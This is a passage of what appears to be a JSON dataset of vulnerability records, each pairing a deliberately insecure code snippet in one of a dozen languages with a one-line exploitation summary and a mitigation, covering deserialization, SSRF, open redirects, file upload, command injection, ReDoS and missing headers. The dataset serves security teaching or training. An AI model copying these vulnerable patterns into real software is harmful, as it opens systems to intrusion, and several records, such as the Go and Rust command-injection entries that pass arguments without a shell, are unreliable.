  "code_snippet": "HttpSession session = request.getSession();",
  "exploitation_techniques": "Reuse sessions indefinitely.",
  "mitigation": "Set: session.setMaxInactiveInterval(3600);"
}
{
  "id": "vuln-781",
  "language": "PHP",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "Sessions without expiration.",
  "code_snippet": "session_start();",
  "exploitation_techniques": "Hijack sessions with no timeout.",
  "mitigation": "Set: ini_set('session.cookie_lifetime', 3600);"
}
{
  "id": "vuln-782",
  "language": "Ruby",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session expiration set.",
  "code_snippet": "use ActionDispatch::Session::CookieStore",
  "exploitation_techniques": "Reuse old sessions.",
  "mitigation": "Set: use ActionDispatch::Session::CookieStore, expire_after: 1.hour"
}
{
  "id": "vuln-783",
  "language": "Go",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "Sessions without expiration.",
  "code_snippet": "session := sessions.NewSession(store, \"session\")",
  "exploitation_techniques": "Hijack sessions with no expiry.",
  "mitigation": "Set: session.Options.MaxAge = 3600"
}
{
  "id": "vuln-784",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session timeout configured.",
  "code_snippet": "services.AddSession();",
  "exploitation_techniques": "Reuse sessions indefinitely.",
  "mitigation": "Set: services.AddSession(options => options.IdleTimeout = TimeSpan.FromMinutes(60));"
}
{
  "id": "vuln-785",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "Sessions without expiration.",
  "code_snippet": "install(Sessions) { cookie<UserSession>(\"session\") }",
  "exploitation_techniques": "Hijack sessions with no timeout.",
  "mitigation": "Set: cookie<UserSession>(\"session\", maxAgeInSeconds = 3600)"
}
{
  "id": "vuln-786",
  "language": "Scala",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session expiration set.",
  "code_snippet": "Ok.withSession(\"user\" -> user.id.toString)",
  "exploitation_techniques": "Reuse old sessions.",
  "mitigation": "Set: Ok.withSession(\"user\" -> user.id.toString, maxAge = Some(3600))"
}
{
  "id": "vuln-787",
  "language": "Rust",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "Sessions without expiration.",
  "code_snippet": "router.get(\"/\", |req, res| req.session()?.set(\"user\", user))",
  "exploitation_techniques": "Hijack sessions with no expiry.",
  "mitigation": "Set: req.session()?.set_max_age(Duration::from_secs(3600))?.set(\"user\", user)"
}
{
  "id": "vuln-788",
  "language": "Elixir",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session expiration configured.",
  "code_snippet": "plug Plug.Session, store: :cookie, key: \"_session\"",
  "exploitation_techniques": "Reuse sessions indefinitely.",
  "mitigation": "Set: plug Plug.Session, store: :cookie, key: \"_session\", max_age: 3600"
}
{
  "id": "vuln-789",
  "language": "Perl",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "Sessions without expiration.",
  "code_snippet": "$r->session->{user} = $user;",
  "exploitation_techniques": "Hijack sessions with no timeout.",
  "mitigation": "Set: $r->session->expire_in(3600); $r->session->{user} = $user;"
}
{
  "id": "vuln-790",
  "language": "Node.js",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Untrusted data deserialization.",
  "code_snippet": "const obj = JSON.parse(req.body.data);",
  "exploitation_techniques": "Inject malicious payloads to execute code.",
  "mitigation": "Validate input: if (isValidSchema(req.body.data)) JSON.parse(req.body.data)"
}
{
  "id": "vuln-791",
  "language": "Python",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data with pickle.",
  "code_snippet": "obj = pickle.loads(request.data)",
  "exploitation_techniques": "Execute arbitrary code via malicious payloads.",
  "mitigation": "Use JSON: json.loads(request.data) with schema validation"
}
{
  "id": "vuln-792",
  "language": "Java",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted input.",
  "code_snippet": "ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); obj = ois.readObject();",
  "exploitation_techniques": "Inject malicious serialized objects.",
  "mitigation": "Avoid: Use JSON with ObjectMapper and validate input"
}
{
  "id": "vuln-793",
  "language": "PHP",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Unserializing untrusted data.",
  "code_snippet": "$obj = unserialize($_POST['data']);",
  "exploitation_techniques": "Execute arbitrary code via malicious input.",
  "mitigation": "Use JSON: json_decode($_POST['data']) with validation"
}
{
  "id": "vuln-794",
  "language": "Ruby",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data with Marshal.",
  "code_snippet": "obj = Marshal.load(params[:data])",
  "exploitation_techniques": "Inject malicious payloads for code execution.",
  "mitigation": "Use JSON: JSON.parse(params[:data]) with schema validation"
}
{
  "id": "vuln-795",
  "language": "Go",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data.",
  "code_snippet": "var obj interface{}; json.NewDecoder(r.Body).Decode(&obj)",
  "exploitation_techniques": "Inject malicious JSON payloads.",
  "mitigation": "Validate: Define struct and validate fields before decoding"
}
{
  "id": "vuln-796",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data.",
  "code_snippet": "var obj = JsonSerializer.Deserialize<object>(request.Body);",
  "exploitation_techniques": "Inject malicious payloads.",
  "mitigation": "Validate: Use specific types and validate input before deserialization"
}
{
  "id": "vuln-797",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data.",
  "code_snippet": "val obj = Json.decodeFromString<Any>(call.receiveText())",
  "exploitation_techniques": "Inject malicious JSON payloads.",
  "mitigation": "Validate: Use specific data class and validate input"
}
{
  "id": "vuln-798",
  "language": "Scala",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data.",
  "code_snippet": "val obj = Json.parse(request.body.asText)",
  "exploitation_techniques": "Inject malicious payloads.",
  "mitigation": "Validate: Use case class and validate input before parsing"
}
{
  "id": "vuln-799",
  "language": "Rust",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data.",
  "code_snippet": "let obj: serde_json::Value = serde_json::from_reader(req.body()?)?;",
  "exploitation_techniques": "Inject malicious JSON payloads.",
  "mitigation": "Validate: Use struct and validate fields before deserialization"
}
{
  "id": "vuln-800",
  "language": "Elixir",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data.",
  "code_snippet": "{:ok, obj} = Jason.decode(params[\"data\"])",
  "exploitation_techniques": "Inject malicious payloads.",
  "mitigation": "Validate: Use struct and validate fields before decoding"
}
{
  "id": "vuln-801",
  "language": "Perl",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data with Storable.",
  "code_snippet": "my $obj = Storable::thaw($r->param('data'));",
  "exploitation_techniques": "Inject malicious payloads for code execution.",
  "mitigation": "Use JSON: decode_json($r->param('data')) with validation"
}
{
  "id": "vuln-802",
  "language": "Node.js",
  "vulnerability_type": "Server-Side Request Forgery (SSRF)",
  "description": "Unvalidated URL requests.",
  "code_snippet": "const response = await axios.get(req.query.url);",
  "exploitation_techniques": "Access internal services or localhost endpoints.",
  "mitigation": "Validate URLs: if (isValidExternalUrl(req.query.url)) axios.get(req.query.url)"
}
{
  "id": "vuln-803",
  "language": "Python",
  "vulnerability_type": "Server-Side Request Forgery (SSRF)",
  "description": "Unrestricted URL fetching.",
  "code_snippet": "response = requests.get(request.args.get('url'))",
  "exploitation_techniques": "Request internal or restricted endpoints.",
  "mitigation": "Restrict: if is_allowed_url(request.args.get('url')): requests.get(...)"
}
{
  "id": "vuln-804",
  "language": "Java",
  "vulnerability_type": "Server-Side Request Forgery (SSRF)",
  "description": "Unvalidated URL in HTTP requests.",
  "code_snippet": "URL url = new URL(request.getParameter(\"url\")); HttpURLConnection conn = url.openConnection();",
  "exploitation_techniques": "Access internal network resources.",
  "mitigation": "Validate: if (isValidUrl(request.getParameter(\"url\"))) url.openConnection()"
}
{
  "id": "vuln-805",
  "language": "PHP",
  "vulnerability_type": "Server-Side Request Forgery (SSRF)",
  "description": "Unrestricted URL fetching.",
  "code_snippet": "$response = file_get_contents($_GET['url']);",
  "exploitation_techniques": "Access internal or sensitive endpoints.",
  "mitigation": "Validate: if (is_allowed_url($_GET['url'])) file_get_contents($_GET['url'])"
}
{
  "id": "vuln-806",
  "language": "Ruby",
  "vulnerability_type": "Server-Side Request Forgery (SSRF)",
  "description": "Unvalidated URL requests.",
  "code_snippet": "response = Net::HTTP.get(URI(params[:url]))",
  "exploitation_techniques": "Access internal services or localhost.",
  "mitigation": "Validate: Net::HTTP.get(URI(params[:url])) if is_valid_url(params[:url])"
}
{
  "id": "vuln-807",
  "language": "Go",
  "vulnerability_type": "Server-Side Request Forgery (SSRF)",
  "description": "Unrestricted URL fetching.",
  "code_snippet": "resp, _ := http.Get(r.URL.Query().Get(\"url\"))",
  "exploitation_techniques": "Request internal or restricted endpoints.",
  "mitigation": "Validate: if isAllowedUrl(r.URL.Query().Get(\"url\")) { http.Get(...) }"
}
{
  "id": "vuln-808",
  "language": "C# (.NET)",
  "vulnerability_type": "Server-Side Request Forgery (SSRF)",
  "description": "Unvalidated URL in HTTP requests.",
  "code_snippet": "var response = await httpClient.GetAsync(request.Query[\"url\"]);",
  "exploitation_techniques": "Access internal network resources.",
  "mitigation": "Validate: if (IsValidUrl(request.Query[\"url\"])) await httpClient.GetAsync(...)"
}
{
  "id": "vuln-809",
  "language": "Kotlin",
  "vulnerability_type": "Server-Side Request Forgery (SSRF)",
  "description": "Unrestricted URL fetching.",
  "code_snippet": "val response = http.get(call.parameters[\"url\"]!!)",
  "exploitation_techniques": "Access internal or sensitive endpoints.",
  "mitigation": "Validate: if (isValidUrl(call.parameters[\"url\"])) http.get(...)"
}
{
  "id": "vuln-810",
  "language": "Scala",
  "vulnerability_type": "Server-Side Request Forgery (SSRF)",
  "description": "Unvalidated URL requests.",
  "code_snippet": "val response = WS.url(params(\"url\")).get()",
  "exploitation_techniques": "Access internal services or localhost.",
  "mitigation": "Validate: if (isValidUrl(params(\"url\"))) WS.url(...).get()"
}
{
  "id": "vuln-811",
  "language": "Rust",
  "vulnerability_type": "Server-Side Request Forgery (SSRF)",
  "description": "Unrestricted URL fetching.",
  "code_snippet": "let resp = reqwest::get(req.param(\"url\")?).await?;",
  "exploitation_techniques": "Request internal or restricted endpoints.",
  "mitigation": "Validate: if is_allowed_url(req.param(\"url\")?) { reqwest::get(...).await? }"
}
{
  "id": "vuln-812",
  "language": "Elixir",
  "vulnerability_type": "Server-Side Request Forgery (SSRF)",
  "description": "Unvalidated URL requests.",
  "code_snippet": "{:ok, response} = HTTPoison.get(params[\"url\"])",
  "exploitation_techniques": "Access internal services or localhost.",
  "mitigation": "Validate: if is_valid_url(params[\"url\"]) do HTTPoison.get(...) end"
}
{
  "id": "vuln-813",
  "language": "Perl",
  "vulnerability_type": "Server-Side Request Forgery (SSRF)",
  "description": "Unrestricted URL fetching.",
  "code_snippet": "my $response = LWP::UserAgent->new->get($r->param('url'));",
  "exploitation_techniques": "Access internal or sensitive endpoints.",
  "mitigation": "Validate: if (is_allowed_url($r->param('url'))) { LWP::UserAgent->new->get(...) }"
}
{
  "id": "vuln-814",
  "language": "Node.js",
  "vulnerability_type": "Insecure Redirects",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "res.redirect(req.query.redirect);",
  "exploitation_techniques": "Redirect users to malicious sites.",
  "mitigation": "Validate: if (isSafeUrl(req.query.redirect)) res.redirect(req.query.redirect)"
}
{
  "id": "vuln-815",
  "language": "Python",
  "vulnerability_type": "Insecure Redirects",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "return redirect(request.args.get('redirect'))",
  "exploitation_techniques": "Redirect to phishing or malicious sites.",
  "mitigation": "Validate: if is_safe_url(request.args.get('redirect')): redirect(...)"
}
{
  "id": "vuln-816",
  "language": "Java",
  "vulnerability_type": "Insecure Redirects",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "response.sendRedirect(request.getParameter(\"redirect\"));",
  "exploitation_techniques": "Redirect users to malicious domains.",
  "mitigation": "Validate: if (isSafeUrl(request.getParameter(\"redirect\"))) response.sendRedirect(...)"
}
{
  "id": "vuln-817",
  "language": "PHP",
  "vulnerability_type": "Insecure Redirects",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "header('Location: ' . $_GET['redirect']);",
  "exploitation_techniques": "Redirect to malicious sites.",
  "mitigation": "Validate: if (is_safe_url($_GET['redirect'])) header('Location: ' . $_GET['redirect']);"
}
{
  "id": "vuln-818",
  "language": "Ruby",
  "vulnerability_type": "Insecure Redirects",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "redirect_to params[:redirect]",
  "exploitation_techniques": "Redirect users to phishing sites.",
  "mitigation": "Validate: redirect_to params[:redirect] if is_safe_url(params[:redirect])"
}
{
  "id": "vuln-819",
  "language": "Go",
  "vulnerability_type": "Insecure Redirects",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "http.Redirect(w, r, r.URL.Query().Get(\"redirect\"), http.StatusFound)",
  "exploitation_techniques": "Redirect to malicious domains.",
  "mitigation": "Validate: if isSafeUrl(r.URL.Query().Get(\"redirect\")) { http.Redirect(...) }"
}
{
  "id": "vuln-820",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Redirects",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "return Redirect(Request.Query[\"redirect\"]);",
  "exploitation_techniques": "Redirect users to malicious sites.",
  "mitigation": "Validate: if (IsSafeUrl(Request.Query[\"redirect\"])) return Redirect(...)"
}
{
  "id": "vuln-821",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Redirects",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "call.respond(redirect(call.parameters[\"redirect\"]!!))",
  "exploitation_techniques": "Redirect to phishing sites.",
  "mitigation": "Validate: if (isSafeUrl(call.parameters[\"redirect\"])) call.respond(redirect(...))"
}
{
  "id": "vuln-822",
  "language": "Scala",
  "vulnerability_type": "Insecure Redirects",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "Redirect(params(\"redirect\"))",
  "exploitation_techniques": "Redirect users to malicious domains.",
  "mitigation": "Validate: if (isSafeUrl(params(\"redirect\"))) Redirect(...)"
}
{
  "id": "vuln-823",
  "language": "Rust",
  "vulnerability_type": "Insecure Redirects",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "res.redirect(req.param(\"redirect\")?)",
  "exploitation_techniques": "Redirect to malicious sites.",
  "mitigation": "Validate: if is_safe_url(req.param(\"redirect\")?) { res.redirect(...) }"
}
{
  "id": "vuln-824",
  "language": "Elixir",
  "vulnerability_type": "Insecure Redirects",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "redirect conn, external: params[\"redirect\"]",
  "exploitation_techniques": "Redirect users to phishing sites.",
  "mitigation": "Validate: if is_safe_url(params[\"redirect\"]) do redirect conn, external: params[\"redirect\"] end"
}
{
  "id": "vuln-825",
  "language": "Perl",
  "vulnerability_type": "Insecure Redirects",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "$r->headers_out->set('Location' => $r->param('redirect'));",
  "exploitation_techniques": "Redirect to malicious domains.",
  "mitigation": "Validate: if (is_safe_url($r->param('redirect'))) { $r->headers_out->set('Location' => ...); }"
}
{
  "id": "vuln-826",
  "language": "Node.js",
  "vulnerability_type": "Insecure File Upload",
  "description": "Unrestricted file uploads.",
  "code_snippet": "app.post('/upload', (req, res) => { req.files.file.mv('/uploads/' + req.files.file.name); });",
  "exploitation_techniques": "Upload malicious files like webshells.",
  "mitigation": "Validate: if (isSafeFile(req.files.file)) req.files.file.mv(...)"
}
{
  "id": "vuln-827",
  "language": "Python",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation on uploaded files.",
  "code_snippet": "file = request.files['file']; file.save('uploads/' + file.filename)",
  "exploitation_techniques": "Upload executable scripts or malware.",
  "mitigation": "Validate: if is_safe_file(file): file.save(...)"
}
{
  "id": "vuln-828",
  "language": "Java",
  "vulnerability_type": "Insecure File Upload",
  "description": "Unrestricted file uploads.",
  "code_snippet": "MultipartFile file = request.getFile(\"file\"); file.transferTo(new File(\"uploads/\" + file.getOriginalFilename()));",
  "exploitation_techniques": "Upload malicious files.",
  "mitigation": "Validate: if (isSafeFile(file)) file.transferTo(...)"
}
{
  "id": "vuln-829",
  "language": "PHP",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation on uploaded files.",
  "code_snippet": "move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",
  "exploitation_techniques": "Upload executable scripts or webshells.",
  "mitigation": "Validate: if (is_safe_file($_FILES['file'])) move_uploaded_file(...)"
}
{
  "id": "vuln-830",
  "language": "Ruby",
  "vulnerability_type": "Insecure File Upload",
  "description": "Unrestricted file uploads.",
  "code_snippet": "File.write(\"uploads/#{params[:file].original_filename}\", params[:file].read)",
  "exploitation_techniques": "Upload malicious files.",
  "mitigation": "Validate: File.write(...) if is_safe_file(params[:file])"
}
{
  "id": "vuln-831",
  "language": "Go",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation on uploaded files.",
  "code_snippet": "file, header, _ := r.FormFile(\"file\"); os.WriteFile(\"uploads/\"+header.Filename, file, 0644)",
  "exploitation_techniques": "Upload executable scripts.",
  "mitigation": "Validate: if isSafeFile(header) { os.WriteFile(...) }"
}
{
  "id": "vuln-832",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure File Upload",
  "description": "Unrestricted file uploads.",
  "code_snippet": "var file = Request.Form.Files[0]; await File.WriteAllBytesAsync(\"uploads/\" + file.FileName, file.OpenReadStream());",
  "exploitation_techniques": "Upload malicious files.",
  "mitigation": "Validate: if (IsSafeFile(file)) await File.WriteAllBytesAsync(...)"
}
{
  "id": "vuln-833",
  "language": "Kotlin",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation on uploaded files.",
  "code_snippet": "val file = call.receiveMultipart().readPart() as FilePart; File(\"uploads/${file.fileName}\").writeBytes(file.streamProvider().readAllBytes())",
  "exploitation_techniques": "Upload executable scripts.",
  "mitigation": "Validate: if (isSafeFile(file)) File(...).writeBytes(...)"
}
{
  "id": "vuln-834",
  "language": "Scala",
  "vulnerability_type": "Insecure File Upload",
  "description": "Unrestricted file uploads.",
  "code_snippet": "val file = request.body.asMultipartFormData.get.file(\"file\").get; Files.write(Paths.get(\"uploads/\" + file.filename), file.ref)",
  "exploitation_techniques": "Upload malicious files.",
  "mitigation": "Validate: if (isSafeFile(file)) Files.write(...)"
}
{
  "id": "vuln-835",
  "language": "Rust",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation on uploaded files.",
  "code_snippet": "let part = req.multipart()?.next_field()?.await?; fs::write(format!(\"uploads/{}\", part.file_name()?), part.bytes()?.await?)?;",
  "exploitation_techniques": "Upload executable scripts.",
  "mitigation": "Validate: if is_safe_file(part.file_name()?) { fs::write(...) }"
}
{
  "id": "vuln-836",
  "language": "Elixir",
  "vulnerability_type": "Insecure File Upload",
  "description": "Unrestricted file uploads.",
  "code_snippet": "file = params[\"file\"]; File.write(\"uploads/#{file.filename}\", file.content)",
  "exploitation_techniques": "Upload malicious files.",
  "mitigation": "Validate: if is_safe_file(file) do File.write(...) end"
}
{
  "id": "vuln-837",
  "language": "Perl",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation on uploaded files.",
  "code_snippet": "my $file = $r->upload('file'); open(my $fh, '>', \"uploads/$file->{filename}\"); print $fh $file->{content};",
  "exploitation_techniques": "Upload executable scripts.",
  "mitigation": "Validate: if (is_safe_file($file)) { open(my $fh, '>', ...); }"
}
{
  "id": "vuln-838",
  "language": "Node.js",
  "vulnerability_type": "Command Injection",
  "description": "Executing untrusted input in shell commands.",
  "code_snippet": "exec(`cat ${req.query.file}`);",
  "exploitation_techniques": "Inject malicious commands via input.",
  "mitigation": "Avoid exec: Use safe file reading like fs.readFileSync"
}
{
  "id": "vuln-839",
  "language": "Python",
  "vulnerability_type": "Command Injection",
  "description": "Running untrusted input in system commands.",
  "code_snippet": "os.system(f'cat {request.args.get(\"file\")}')",
  "exploitation_techniques": "Inject arbitrary commands.",
  "mitigation": "Use safe APIs: open(request.args.get('file'), 'r').read() with validation"
}
{
  "id": "vuln-840",
  "language": "Java",
  "vulnerability_type": "Command Injection",
  "description": "Executing untrusted input in commands.",
  "code_snippet": "Runtime.getRuntime().exec(\"cat \" + request.getParameter(\"file\"));",
  "exploitation_techniques": "Inject malicious commands.",
  "mitigation": "Avoid exec: Use Files.readString(Path.of(file)) with validation"
}
{
  "id": "vuln-841",
  "language": "PHP",
  "vulnerability_type": "Command Injection",
  "description": "Running untrusted input in shell commands.",
  "code_snippet": "shell_exec('cat ' . $_GET['file']);",
  "exploitation_techniques": "Inject arbitrary commands.",
  "mitigation": "Use safe APIs: file_get_contents($_GET['file']) with validation"
}
{
  "id": "vuln-842",
  "language": "Ruby",
  "vulnerability_type": "Command Injection",
  "description": "Executing untrusted input in system commands.",
  "code_snippet": "system(\"cat #{params[:file]}\")",
  "exploitation_techniques": "Inject malicious commands.",
  "mitigation": "Use safe APIs: File.read(params[:file]) with validation"
}
{
  "id": "vuln-843",
  "language": "Go",
  "vulnerability_type": "Command Injection",
  "description": "Running untrusted input in commands.",
  "code_snippet": "exec.Command(\"cat\", r.URL.Query().Get(\"file\")).Run()",
  "exploitation_techniques": "Inject arbitrary commands.",
  "mitigation": "Use safe APIs: os.ReadFile(r.URL.Query().Get(\"file\")) with validation"
}
{
  "id": "vuln-844",
  "language": "C# (.NET)",
  "vulnerability_type": "Command Injection",
  "description": "Executing untrusted input in commands.",
  "code_snippet": "Process.Start(\"cmd.exe\", \"/c cat \" + Request.Query[\"file\"]);",
  "exploitation_techniques": "Inject malicious commands.",
  "mitigation": "Use safe APIs: File.ReadAllText(Request.Query[\"file\"]) with validation"
}
{
  "id": "vuln-845",
  "language": "Kotlin",
  "vulnerability_type": "Command Injection",
  "description": "Running untrusted input in system commands.",
  "code_snippet": "ProcessBuilder(\"cat\", call.parameters[\"file\"]!!).start()",
  "exploitation_techniques": "Inject arbitrary commands.",
  "mitigation": "Use safe APIs: File(call.parameters[\"file\"]).readText() with validation"
}
{
  "id": "vuln-846",
  "language": "Scala",
  "vulnerability_type": "Command Injection",
  "description": "Executing untrusted input in commands.",
  "code_snippet": "import sys.process._; s\"cat ${params(\"file\")}\".!",
  "exploitation_techniques": "Inject malicious commands.",
  "mitigation": "Use safe APIs: Files.readString(Paths.get(params(\"file\"))) with validation"
}
{
  "id": "vuln-847",
  "language": "Rust",
  "vulnerability_type": "Command Injection",
  "description": "Running untrusted input in commands.",
  "code_snippet": "Command::new(\"cat\").arg(req.param(\"file\")?).output()?",
  "exploitation_techniques": "Inject arbitrary commands.",
  "mitigation": "Use safe APIs: fs::read_to_string(req.param(\"file\")?)? with validation"
}
{
  "id": "vuln-848",
  "language": "Elixir",
  "vulnerability_type": "Command Injection",
  "description": "Executing untrusted input in system commands.",
  "code_snippet": "System.cmd(\"cat\", [params[\"file\"]])",
  "exploitation_techniques": "Inject malicious commands.",
  "mitigation": "Use safe APIs: File.read(params[\"file\"]) with validation"
}
{
  "id": "vuln-849",
  "language": "Perl",
  "vulnerability_type": "Command Injection",
  "description": "Running untrusted input in shell commands.",
  "code_snippet": "system(\"cat \" . $r->param('file'));",
  "exploitation_techniques": "Inject arbitrary commands.",
  "mitigation": "Use safe APIs: read_file($r->param('file')) with validation"
}
{
  "id": "vuln-850",
  "language": "Node.js",
  "vulnerability_type": "Insecure Regular Expression",
  "description": "Using regex vulnerable to ReDoS.",
  "code_snippet": "const re = /^((a+)+)$/; re.test(req.query.input);",
  "exploitation_techniques": "Craft input to cause exponential backtracking.",
  "mitigation": "Use safe regex: /^a+$/ or limit input length"
}
{
  "id": "vuln-851",
  "language": "Python",
  "vulnerability_type": "Insecure Regular Expression",
  "description": "Regex vulnerable to ReDoS.",
  "code_snippet": "import re; re.match(r'^((a+)+)$', request.args.get('input'))",
  "exploitation_techniques": "Trigger ReDoS with malicious input.",
  "mitigation": "Use safe regex: r'^a+$' or enforce input size limits"
}
{
  "id": "vuln-852",
  "language": "Java",
  "vulnerability_type": "Insecure Regular Expression",
  "description": "Regex susceptible to ReDoS.",
  "code_snippet": "Pattern.compile(\"^((a+)+)$\").matcher(request.getParameter(\"input\")).matches();",
  "exploitation_techniques": "Cause denial of service via backtracking.",
  "mitigation": "Use safe regex: Pattern.compile(\"^a+$\") or limit input length"
}
{
  "id": "vuln-853",
  "language": "PHP",
  "vulnerability_type": "Insecure Regular Expression",
  "description": "Regex vulnerable to ReDoS.",
  "code_snippet": "preg_match('/^((a+)+)$/', $_GET['input']);",
  "exploitation_techniques": "Trigger exponential backtracking.",
  "mitigation": "Use safe regex: '/^a+$/' or restrict input size"
}
{
  "id": "vuln-854",
  "language": "Ruby",
  "vulnerability_type": "Insecure Regular Expression",
  "description": "Regex susceptible to ReDoS.",
  "code_snippet": "/^((a+)+)$/.match?(params[:input])",
  "exploitation_techniques": "Cause ReDoS with crafted input.",
  "mitigation": "Use safe regex: /^a+$/ or limit input length"
}
{
  "id": "vuln-855",
  "language": "Go",
  "vulnerability_type": "Insecure Regular Expression",
  "description": "Regex vulnerable to ReDoS.",
  "code_snippet": "re := regexp.MustCompile(`^((a+)+)$`); re.MatchString(r.URL.Query().Get(\"input\"))",
  "exploitation_techniques": "Trigger denial of service via backtracking.",
  "mitigation": "Use safe regex: `^a+$` or enforce input size limits"
}
{
  "id": "vuln-856",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Regular Expression",
  "description": "Regex susceptible to ReDoS.",
  "code_snippet": "Regex.IsMatch(Request.Query[\"input\"], \"^((a+)+)$\");",
  "exploitation_techniques": "Cause ReDoS with malicious input.",
  "mitigation": "Use safe regex: \"^a+$\" or limit input length"
}
{
  "id": "vuln-857",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Regular Expression",
  "description": "Regex vulnerable to ReDoS.",
  "code_snippet": "Regex(\"^((a+)+)$\").matches(call.parameters[\"input\"]!!)",
  "exploitation_techniques": "Trigger exponential backtracking.",
  "mitigation": "Use safe regex: Regex(\"^a+$\") or restrict input size"
}
{
  "id": "vuln-858",
  "language": "Scala",
  "vulnerability_type": "Insecure Regular Expression",
  "description": "Regex susceptible to ReDoS.",
  "code_snippet": "val re = \"^((a+)+)$\".r; re.findFirstIn(params(\"input\")).isDefined",
  "exploitation_techniques": "Cause ReDoS with crafted input.",
  "mitigation": "Use safe regex: \"^a+$\".r or limit input length"
}
{
  "id": "vuln-859",
  "language": "Rust",
  "vulnerability_type": "Insecure Regular Expression",
  "description": "Regex vulnerable to ReDoS.",
  "code_snippet": "let re = Regex::new(r"^((a+)+)$")?; re.is_match(req.param("input")?)",
  "exploitation_techniques": "Trigger denial of service via backtracking.",
  "mitigation": "Use safe regex: r"^a+$" or enforce input size limits"
}
{
  "id": "vuln-860",
  "language": "Elixir",
  "vulnerability_type": "Insecure Regular Expression",
  "description": "Regex susceptible to ReDoS.",
  "code_snippet": "Regex.match?(~r/^((a+)+)$/, params[\"input\"])",
  "exploitation_techniques": "Cause ReDoS with malicious input.",
  "mitigation": "Use safe regex: ~r/^a+$/ or limit input length"
}
{
  "id": "vuln-861",
  "language": "Perl",
  "vulnerability_type": "Insecure Regular Expression",
  "description": "Regex vulnerable to ReDoS.",
  "code_snippet": "my $input = $r->param('input'); $input =~ /^((a+)+)$/;",
  "exploitation_techniques": "Trigger exponential backtracking.",
  "mitigation": "Use safe regex: /^a+$/ or restrict input size"
}
{
  "id": "vuln-862",
  "language": "Node.js",
  "vulnerability_type": "Insecure HTTP Headers",
  "description": "Missing security headers like X-Frame-Options.",
  "code_snippet": "app.get('/', (req, res) => res.send('Home'));",
  "exploitation_techniques": "Enable clickjacking attacks.",
  "mitigation": "Add: res.set('X-Frame-Options', 'DENY')"
}
{
  "id": "vuln-863",
  "language": "Python",
  "vulnerability_type": "Insecure HTTP Headers",
  "description": "Missing X-Frame-Options header.",
  "code_snippet": "@app.route('/') def home(): return 'Home'",
  "exploitation_techniques": "Facilitate clickjacking.",
  "mitigation": "Add: response.headers['X-Frame-Options'] = 'DENY'"
}
{
  "id": "vuln-864",
  "language": "Java",
  "vulnerability_type": "Insecure HTTP Headers",
  "description": "Missing security headers.",
  "code_snippet": "@GetMapping(\"/\") public String home() { return \"Home\"; }",
  "exploitation_techniques": "Enable clickjacking or other attacks.",
  "mitigation": "Add: response.setHeader(\"X-Frame-Options\", \"DENY\")"
}
{
  "id": "vuln-865",
  "language": "PHP",
  "vulnerability_type": "Insecure HTTP Headers",
  "description": "Missing X-Frame-Options header.",
  "code_snippet": "echo 'Home';",
  "exploitation_techniques": "Facilitate clickjacking attacks.",
  "mitigation": "Add: header('X-Frame-Options: DENY');"
}
{
  "id": "vuln-866",
  "language": "Ruby",
  "vulnerability_type": "Insecure HTTP Headers",
  "description": "Missing security headers.",
  "code_snippet": "get '/' do 'Home' end",
  "exploitation_techniques": "Enable clickjacking.",
  "mitigation": "Add: response.headers['X-Frame-Options'] = 'DENY'"
}
{
  "id": "vuln-867",
  "language": "Go",
  "vulnerability_type": "Insecure HTTP Headers",
  "description": "Missing X-Frame-Options header.",
  "code_snippet": "http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, \"Home\") })",
  "exploitation_techniques": "Facilitate clickjacking attacks.",
  "mitigation": "Add: w.Header().Set(\"X-Frame-Options\", \"DENY\")"
}
{
  "id": "vuln-868",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure HTTP Headers",
  "description": "Missing security headers.",
  "code_snippet": "[HttpGet(\"/\")] public IActionResult Home() { return Ok(\"Home\"); }",
